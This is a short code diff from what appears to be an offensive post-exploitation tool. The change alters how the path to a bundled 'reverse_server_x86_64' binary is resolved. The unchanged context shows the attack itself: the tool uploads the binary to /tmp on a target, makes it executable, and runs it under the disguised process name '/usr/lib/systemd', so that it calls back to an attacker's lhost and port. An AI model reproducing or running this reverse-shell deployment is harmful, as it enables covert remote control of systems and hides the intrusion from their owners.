@@ -1,4 +1,4 @@
-from os import getcwd, path
+from os import path
 from threading import Thread
 
 from libs.c64 import encrypt
@@ -62,7 +62,7 @@ def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"
     else:
         print(color.yellow(f"Use Mode 3->upload"))
         filename = encrypt(f"{lhost}-{port}")
-        if not upload(path.join(getcwd(), "auxiliary", "reshell", "reverse_server_x86_64"), "/tmp/%s" % filename, True):
+        if not upload(path.join(gget("root_path"), "auxiliary", "reshell", "reverse_server_x86_64"), "/tmp/%s" % filename, True):
             return
         command = get_system_code(f"cd /tmp && chmod +x {filename} && ./{filename} {fakename}", False)
     t = Thread(target=delay_send, args=(2, command))
